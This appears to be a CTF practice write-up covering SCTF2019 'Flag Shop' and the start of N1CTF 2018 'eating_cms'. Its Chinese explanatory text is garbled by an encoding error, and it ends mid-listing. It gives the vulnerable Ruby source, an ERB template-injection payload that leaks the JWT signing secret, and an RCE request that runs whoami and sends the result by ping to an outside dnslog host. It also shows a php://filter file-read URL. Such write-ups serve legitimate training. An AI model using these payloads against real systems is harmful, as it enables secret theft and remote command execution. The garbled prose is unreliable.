<h2 id="sctf2019flag-shop">[SCTF2019]Flag Shop
</h2><p>ÁõÆÂΩïÊâ´Êèèrobots.txt</p>
<p>Ê∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;sinatra&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;sinatra/cookies&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;sinatra/json&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;jwt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;securerandom&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;erb&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="ss">:public_folder</span><span class="p">,</span> <span class="no">File</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="bp">__FILE__</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/static&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">FLAGPRICE</span> <span class="o">=</span> <span class="mi">1000000000000000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="o">=</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">hex</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">configure</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">enable</span> <span class="ss">:logging</span>
</span></span><span class="line"><span class="cl">  <span class="n">file</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">File</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="bp">__FILE__</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/../log/http.log&#39;</span><span class="p">,</span><span class="s2">&#34;a+&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">file</span><span class="o">.</span><span class="n">sync</span> <span class="o">=</span> <span class="kp">true</span>
</span></span><span class="line"><span class="cl">  <span class="n">use</span> <span class="no">Rack</span><span class="o">::</span><span class="no">CommonLogger</span><span class="p">,</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">redirect</span> <span class="s1">&#39;/shop&#39;</span><span class="p">,</span> <span class="mi">302</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/filebak&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">content_type</span> <span class="ss">:text</span>
</span></span><span class="line"><span class="cl">  <span class="n">erb</span> <span class="no">IO</span><span class="o">.</span><span class="n">binread</span> <span class="bp">__FILE__</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/api/auth&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="ss">uid</span><span class="p">:</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">uuid</span> <span class="p">,</span> <span class="ss">jkl</span><span class="p">:</span> <span class="mi">20</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">encode</span> <span class="n">payload</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">  <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/api/info&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">islogin</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">decode</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="kp">true</span><span class="p">,</span> <span class="p">{</span> <span class="ss">algorithm</span><span class="p">:</span> <span class="s1">&#39;HS256&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">json</span><span class="p">({</span><span class="ss">uid</span><span class="p">:</span> <span class="n">auth</span><span class="o">[</span><span class="mi">0</span><span class="o">][</span><span class="s2">&#34;uid&#34;</span><span class="o">]</span><span class="p">,</span><span class="ss">jkl</span><span class="p">:</span> <span class="n">auth</span><span class="o">[</span><span class="mi">0</span><span class="o">][</span><span class="s2">&#34;jkl&#34;</span><span class="o">]</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/shop&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">erb</span> <span class="ss">:shop</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/work&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">islogin</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">decode</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="kp">true</span><span class="p">,</span> <span class="p">{</span> <span class="ss">algorithm</span><span class="p">:</span> <span class="s1">&#39;HS256&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="n">auth</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">  <span class="k">unless</span> <span class="n">params</span><span class="o">[</span><span class="ss">:SECRET</span><span class="o">].</span><span class="n">nil?</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:SECRET</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="sr">/[0-9a-z]+/</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nb">puts</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;FLAG&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">end</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:do</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">][</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="o">]</span><span class="si">}</span><span class="s2"> is working&#34;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">auth</span><span class="o">[</span><span class="s2">&#34;jkl&#34;</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span><span class="o">[</span><span class="s2">&#34;jkl&#34;</span><span class="o">].</span><span class="n">to_i</span> <span class="o">+</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">random_number</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">encode</span> <span class="n">auth</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span>
</span></span><span class="line"><span class="cl">    <span class="no">ERB</span><span class="o">::</span><span class="kp">new</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">][</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="o">]</span><span class="si">}</span><span class="s2"> working successfully!&#39;)&lt;/script&gt;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">post</span> <span class="s2">&#34;/shop&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">islogin</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">decode</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="kp">true</span><span class="p">,</span> <span class="p">{</span> <span class="ss">algorithm</span><span class="p">:</span> <span class="s1">&#39;HS256&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">auth</span><span class="o">[</span><span class="mi">0</span><span class="o">][</span><span class="s2">&#34;jkl&#34;</span><span class="o">]</span> <span class="o">&lt;</span> <span class="no">FLAGPRICE</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">json</span><span class="p">({</span><span class="ss">title</span><span class="p">:</span> <span class="s2">&#34;error&#34;</span><span class="p">,</span><span class="ss">message</span><span class="p">:</span> <span class="s2">&#34;no enough jkl&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">auth</span> <span class="o">&lt;&lt;</span> <span class="p">{</span><span class="ss">flag</span><span class="p">:</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;FLAG&#34;</span><span class="o">]</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">encode</span> <span class="n">auth</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span>
</span></span><span class="line"><span class="cl">    <span class="n">json</span><span class="p">({</span><span class="ss">title</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span><span class="ss">message</span><span class="p">:</span> <span class="s2">&#34;jkl is good thing&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">islogin</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">].</span><span class="n">nil?</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="n">redirect</span> <span class="n">to</span><span class="p">(</span><span class="s1">&#39;/shop&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ERBÊ®°ÊùøÊ≥®ÂÖ•</p>
<p>Ê≥®ÂÖ•ÁÇπ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:do</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">][</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="o">]</span><span class="si">}</span><span class="s2"> is working&#34;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">auth</span><span class="o">[</span><span class="s2">&#34;jkl&#34;</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span><span class="o">[</span><span class="s2">&#34;jkl&#34;</span><span class="o">].</span><span class="n">to_i</span> <span class="o">+</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">random_number</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">encode</span> <span class="n">auth</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span>
</span></span><span class="line"><span class="cl">    <span class="no">ERB</span><span class="o">::</span><span class="kp">new</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">][</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="o">]</span><span class="si">}</span><span class="s2"> working successfully!&#39;)&lt;/script&gt;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">result</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>doÂíånameË¶ÅÁõ∏ÂêåÔºåÊúâÈïøÂ∫¶ÈôêÂà∂7Â≠óÁ¨¶ÔºåÈô§Âéª<code>&lt;%=%&gt;</code>Âè™Ââ©‰∏ã‰∏§‰∏™Â≠óÁ¨¶ÔºåÂà©Áî®rubyÁöÑÈ¢ÑÂÆö‰πâÂèòÈáè<code>$'</code>,ÂèØ‰ª•ÂåπÈÖçÊúÄÂêé‰∏ÄÊ¨°ÂåπÈÖçÂè≥ËæπÁöÑÂÜÖÂÆπ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="k">unless</span> <span class="n">params</span><span class="o">[</span><span class="ss">:SECRET</span><span class="o">].</span><span class="n">nil?</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:SECRET</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="sr">/[0-9a-z]+/</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nb">puts</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;FLAG&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">end</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåËøòÊúâÊ≠£ÂàôÂåπÈÖçÔºåÈúÄË¶ÅÊúâSECRETÂèÇÊï∞‰∏î‰∏∫false,<code>$'</code>Â∞±ËÉΩËé∑Âèñsecret</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%=$&#39;%&gt;
</span></span><span class="line"><span class="cl">urlÁºñÁ†Å‰∏Ä‰∏ãÔºö%3C%25%3D%24%27%25%3E
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁîöËá≥ÂèØ‰ª•‰∏ç‰º†SECRETÂèÇÊï∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/work?name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëé∑ÂèñÂà∞secretÂÄº</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165429367.png"
	width="1847"
	height="638"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165429367_hu16146000464038398674.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426165429367_hu4458420793493097326.png 1024w"
	loading="lazy"
	
		alt="image-20250426165429367"
	
	
		class="gallery-image" 
		data-flex-grow="289"
		data-flex-basis="694px"
	
></p>
<p>ÊãøÁùÄkey‰º™ÈÄ†</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165808850.png"
	width="1451"
	height="616"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165808850_hu11459710184018445397.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426165808850_hu6144835324377429294.png 1024w"
	loading="lazy"
	
		alt="image-20250426165808850"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="565px"
	
></p>
<p>/shopË∑ØÁî±Êîπcookie</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165855107.png"
	width="1564"
	height="688"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165855107_hu6464364018435507476.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426165855107_hu12807538563112248723.png 1024w"
	loading="lazy"
	
		alt="image-20250426165855107"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="545px"
	
></p>
<p>ËøôÈáåÁúãÂà∞ÊúârceÁöÑÂÅöÊ≥ï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="vg">$a</span> <span class="o">=</span> <span class="s2">&#34;mon123&#34;</span>
</span></span><span class="line"><span class="cl"><span class="vg">$b</span> <span class="o">=</span> <span class="nb">Array</span><span class="o">[</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span><span class="s2">&#34;bbb&#34;</span><span class="p">,</span><span class="s2">&#34;ccc&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;$a: </span><span class="si">#{</span><span class="vg">$a</span><span class="o">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">//</span><span class="n">mon</span>
</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;$b: </span><span class="si">#{</span><span class="vg">$b</span><span class="o">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">//[</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span><span class="s2">&#34;bbb&#34;</span><span class="p">,</span><span class="s2">&#34;ccc&#34;</span><span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÔºå$bÂéüÊú¨ÊòØÊï∞ÁªÑÔºå‰ΩÜÊòØÂõ†‰∏∫Ë¢´ÊãºÊé•Âà∞‰∫ÜÂ≠óÁ¨¶‰∏≤‰∏≠ÔºåÊâÄ‰ª•Êï∞ÁªÑÈªòËÆ§ÁöÑÁ±ªÂûãÂèòÊàê‰∫Ü<code>[&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;]</code>,ËøôÊ†∑‰∏äÈù¢‰ª£Á†ÅÁöÑÈôêÂà∂Ôºå‰ªéÂéüÊú¨ÁöÑ7‰∏™Â≠óÁ¨¶ÔºåÂèòÊàê‰∫Ü7‰∏™Êï∞ÁªÑÈïøÂ∫¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">work</span><span class="o">?</span><span class="n">name</span><span class="p">[]</span><span class="o">=&lt;%=</span><span class="nf">system</span><span class="p">(</span><span class="s1">&#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn&#39;</span><span class="p">)</span><span class="o">%&gt;&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">3</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">4</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">5</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">6</span><span class="o">&amp;</span><span class="n">do</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;&lt;%=system(&#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn&#39;)%&gt;&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;2&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;3&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;4&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;5&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;6&#34;</span><span class="p">]</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">working</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="n1ctf-2018eating_cms">[N1CTF 2018]eating_cms
</h2><p>ÂÖàËøõregister.phpÊ≥®ÂÜåÂêéÁôªÂÖ•</p>
<p>urlÂèØ‰ª•‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</p>
<p>‰º™ÂçèËÆÆËØª‰∏Ä‰∏ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user.php?page=php://filter/convert.base64-encode/resource=index
</span></span></code></pre></td></tr></table>
</div>
</div><p>function.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
